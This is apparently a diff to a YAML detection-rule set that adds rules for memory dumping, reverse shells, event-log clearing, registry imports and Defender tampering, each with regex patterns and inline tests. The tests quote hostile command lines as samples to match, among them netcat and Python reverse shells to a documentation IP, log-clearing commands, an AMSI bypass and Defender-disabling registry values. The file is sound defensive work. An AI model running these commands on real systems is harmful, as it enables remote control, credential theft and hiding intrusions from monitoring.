@@ -13,7 +13,7 @@
 #   Regexes may not contain unbounded wildcards (.* / .+): use a bounded gap such as .{0,200}
 #   (enforced at load time to rule out catastrophic backtracking on attacker-controlled input).
 #   Every rule ships inline `tests` (a positive and a negative case); CI fails if they regress.
-version: "2026.10.2"
+version: "2026.11.1"
 rules:
 
 # =============================================================== RECONNAISSANCE / DISCOVERY
@@ -535,6 +535,30 @@ rules:
     - {event: {process_name: x.exe, raw_data: {target_image: 'C:\Windows\system32\lsass.exe', granted_access: '0x1010'}}, expect_match: true}
     - {event: {process_name: MsMpEng.exe, raw_data: {target_image: 'C:\Windows\system32\lsass.exe', granted_access: '0x1010'}}, expect_match: false}
 
+- id: TB-CRED-005
+  name: Process-memory dump by a tool that is not an approved debugger
+  severity: high
+  confidence: 70
+  techniques: [T1003.001, T1003]
+  tags: [credential-access, memory-dump, behavioural-signature]
+  tuning: Crash-handling services and developer tooling dump memory legitimately; exclude by process_name and parent_process.
+  match:
+    all:
+      - any:
+          - {field: command_line, regex: '(?:^|\s)--?(?:pid|target|target-pid|process|process-id|proc|ppid)(?:=|\s{1,3})\d{2,6}\b.{0,160}\s--?(?:out|output|outfile|dump|file|o|f)(?:=|\s{1,3})\S{0,120}\.(?:bin|dmp|dump|mem|raw|dat)\b'}
+          - {field: command_line, regex: '\s--?(?:out|output|outfile|dump|file|o|f)(?:=|\s{1,3})\S{0,120}\.(?:bin|dmp|dump|mem|raw|dat)\b.{0,160}\s--?(?:pid|target|target-pid|process|process-id|proc|ppid)(?:=|\s{1,3})\d{2,6}\b'}
+          - {field: command_line, regex: '\b(rdrleakdiag|sqldumper|createdump|avdump|dumpminitool|tttracer)(\.exe)?\s.{0,100}\b\d{2,6}\b'}
+          - {field: command_line, regex: 'procdump(64)?(\.exe)?\s.{0,60}-(ma|mm|mp|mt)\s.{0,20}\b\d{3,6}\b'}
+          - {field: command_line, regex: '(minidumpwritedump|ntreadvirtualmemory|sedebugprivilege|--dump-lsass|dump_lsass)'}
+      - not: {field: command_line, regex: '(^|[\s/\\"])(strace|ltrace|gdb|lldb|perf|jstack|jmap|jcmd|pstack|dotnet-dump|dotnet-gcdump|py-spy|valgrind|tcpdump|top|htop|ps)(\.exe)?(\s|$)'}
+  tests:
+    - {name: pid plus dump-like output, event: {command_line: 'update-helper.exe --target 612 --out c:\temp\x.bin'}, expect_match: true}
+    - {name: reordered options, event: {command_line: 'tool.exe -o C:\Users\Public\p.dmp --pid 4120'}, expect_match: true}
+    - {name: LOLBin dumper, event: {command_line: 'rdrleakdiag.exe /p 624 /o c:\temp /fullmemdmp /wait 1'}, expect_match: true}
+    - {name: strace is a debugger, event: {command_line: 'strace -p 1234 -o trace.dat'}, expect_match: false}
+    - {name: pid without output file, event: {command_line: 'backup-agent --pid 4120 --verbose'}, expect_match: false}
+    - {name: dotnet-dump collect, event: {command_line: 'dotnet-dump collect -p 4120 -o /tmp/app.dmp'}, expect_match: false}
+
 - id: TB-CRED-002
   name: Credential store extraction (SAM / NTDS / shadow)
   severity: high
@@ -639,8 +663,15 @@ rules:
       - {field: command_line, regex: 'socat\s.{0,60}(exec|system):.{0,40}(/bin/(ba)?sh|cmd)'}
       - {field: command_line, regex: 'openssl\s+s_client\s.{0,40}-connect.{0,80}(/bin/(ba)?sh|mkfifo)'}
       - {field: command_line, regex: 'new-object\s+(system\.)?net\.sockets\.tcpclient.{0,200}(getstream|invoke-expression|iex|\.read\()'}
+      # any binary (renamed netcat, busybox nc, a custom helper) handed a shell with -e/-c plus a host and numeric port
+      - {field: command_line, regex: '(?:^|[\s/\\])\S{1,40}\s.{0,40}\b(?:\d{1,3}\.){3}\d{1,3}\s{1,3}\d{2,5}\b.{0,30}\s-(?:e|c)\s{1,3}\S{0,12}(?:sh|bash|dash|zsh|cmd|cmd\.exe|powershell)\b'}
+      - {field: command_line, regex: '(?:^|[\s/\\])\S{1,40}\s(?:.{0,20}\s)?-(?:e|c)\s{1,3}\S{0,12}(?:sh|bash|dash|zsh|cmd|cmd\.exe|powershell)\b.{0,30}\s(?:\d{1,3}\.){3}\d{1,3}\s{1,3}\d{2,5}\b'}
   tests:
     - {event: {command_line: "bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'"}, expect_match: true}
+    - {name: renamed netcat, event: {command_line: 'svc-helper 198.51.100.7 4444 -e /bin/sh'}, expect_match: true}
+    - {name: flag first, event: {command_line: 'helper.exe -e cmd.exe 198.51.100.7 9001'}, expect_match: true}
+    - {name: ssh with remote command is not a reverse shell, event: {command_line: 'ssh -p 2222 deploy@10.0.0.5 -c aes256-ctr'}, expect_match: false}
+    - {name: sh -c with a local command, event: {command_line: 'sh -c /usr/local/bin/backup.sh'}, expect_match: false}
     - {event: {command_line: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"198.51.100.7\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"])'"}, expect_match: true}
     - {event: {command_line: 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 198.51.100.7 4444 >/tmp/f'}, expect_match: true}
     - {event: {command_line: 'nc -zv 10.0.0.5 22'}, expect_match: false}
@@ -981,6 +1012,8 @@ rules:
     any:
       - {field: command_line, regex: 'wevtutil(\.exe)?\s+(cl|clear-log)\b'}
       - {field: command_line, regex: 'clear-eventlog|remove-eventlog'}
+      - {field: command_line, regex: '(eventlogsession|eventing\.reader).{0,80}\.clearlog\s*\(|\.clearlog\s*\(\s*[''"]?(security|system|application|microsoft)|\[system\.diagnostics\.eventlog\]\s*::\s*(delete|clear)'}
+      - {field: command_line, regex: 'wevtutil(\.exe)?\s+sl\s.{0,60}/e(nabled)?:\s?false|auditpol(\.exe)?\s+/(clear|remove)\b'}
       - {field: command_line, regex: '(unset\s+histfile|histsize=0|histfile=/dev/null|history\s+-c|rm\s+(-\w+\s+)?\S{0,40}\.(bash|zsh)_history|(>|truncate\s+-s\s?0)\s{0,3}\S{0,40}\.(bash|zsh)_history)'}
       - {field: command_line, regex: '(shred|rm\s+(-\w+\s+)?|truncate\s+-s\s?0\s+|>\s{0,3})\s{0,3}/var/log/(auth\.log|secure|syslog|messages|wtmp|btmp|lastlog|audit/audit\.log|kern\.log)'}
       - {field: event_type, regex: '^system\.(log_cleared|audit_log_cleared)|log_cleared'}
@@ -992,6 +1025,10 @@ rules:
     - {event: {command_line: 'export HISTFILE=/dev/null'}, expect_match: true}
     - {event: {raw_data: {event_code: '1102'}}, expect_match: true}
     - {event: {command_line: 'tail -f /var/log/auth.log'}, expect_match: false}
+    - {name: .NET api, event: {command_line: "powershell -c [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog('Security')"}, expect_match: true}
+    - {name: channel disabled, event: {command_line: 'wevtutil sl Microsoft-Windows-Sysmon/Operational /e:false'}, expect_match: true}
+    - {name: reading the log is fine, event: {command_line: 'wevtutil qe Security /c:5 /f:text'}, expect_match: false}
+    - {name: listing logs is fine, event: {command_line: "powershell -c [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.GetLogNames()"}, expect_match: false}
 
 - id: TB-EVADE-002
   name: Security tooling disabled, excluded or uninstalled
@@ -1053,6 +1090,45 @@ rules:
     - {event: {command_line: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"}, expect_match: true}
     - {event: {command_line: 'reg add HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f'}, expect_match: true}
     - {event: {command_line: 'powershell Get-ChildItem C:\'}, expect_match: false}
+
+- id: TB-EVADE-010
+  name: Registry file imported silently from a user-writable location
+  severity: medium
+  confidence: 65
+  techniques: [T1112, T1562.001]
+  tags: [defense-evasion, registry]
+  tuning: Software installers and profile tools import .reg files from temp during setup; exclude by parent_process or signed installer paths.
+  match:
+    any:
+      - {field: command_line, regex: 'reg(\.exe)?\s+import\s+"?\S{0,120}(\\users\\public\\|\\temp\\|\\appdata\\|\\programdata\\|\\downloads\\|\\perflogs\\|%temp%|%appdata%|%public%|\\\$recycle)'}
+      - {field: command_line, regex: 'regedit(\.exe)?\s+/s\s+"?\S{0,120}(\\users\\public\\|\\temp\\|\\appdata\\|\\programdata\\|\\downloads\\|%temp%|%appdata%|%public%)'}
+  tests:
+    - {event: {command_line: 'reg import C:\Users\Public\d.reg'}, expect_match: true}
+    - {event: {command_line: 'regedit /s C:\Windows\Temp\x.reg'}, expect_match: true}
+    - {name: admin baseline, event: {command_line: 'reg import C:\ops\baselines\hardening.reg'}, expect_match: false}
+    - {name: export is not import, event: {command_line: 'reg export HKLM\Software\Vendor C:\Users\Public\vendor.reg'}, expect_match: false}
+
+- id: TB-EVADE-011
+  name: Security control disabled or excluded through a registry value (host telemetry)
+  severity: high
+  confidence: 80
+  techniques: [T1562.001, T1112]
+  tags: [defense-evasion, registry, tamper, telemetry]
+  tuning: Security teams and GPO write these values legitimately; exclude the managing account or process.
+  match:
+    any:
+      - all:
+          - {field: raw.target_object, regex: '(windows defender|windowsdefender|microsoft antimalware).{0,80}\\(disableantispyware|disableantivirus|disablerealtimemonitoring|disablebehaviormonitoring|disableioavprotection|disablescriptscanning|disableonaccessprotection|tamperprotection)$'}
+          - {field: raw.details, regex: '(0x0*1\b|^1$|dword \(0x0*1\))'}
+      - {field: raw.target_object, regex: '(windows defender|microsoft antimalware)\\exclusions\\(paths|extensions|processes)\\'}
+      - all:
+          - {field: raw.target_object, regex: '\\(scriptblocklogging\\enablescriptblocklogging|modulelogging\\enablemodulelogging|eventlog\\[^\\]+\\(maxsize|retention))$'}
+          - {field: raw.details, regex: '(0x0*0\b|^0$|dword \(0x0*0\))'}
+  tests:
+    - {event: {event_type: registry.value_set, raw_data: {target_object: 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware', details: 'DWORD (0x00000001)'}}, expect_match: true}
+    - {event: {event_type: registry.value_set, raw_data: {target_object: 'HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users\Public', details: 'DWORD (0x00000000)'}}, expect_match: true}
+    - {name: enabling protection is fine, event: {event_type: registry.value_set, raw_data: {target_object: 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware', details: 'DWORD (0x00000000)'}}, expect_match: false}
+    - {name: unrelated value, event: {event_type: registry.value_set, raw_data: {target_object: 'HKCU\Software\Vendor\Theme', details: 'dark'}}, expect_match: false}
 
 - id: TB-EVADE-003
   name: Masquerading system process running from an unexpected path
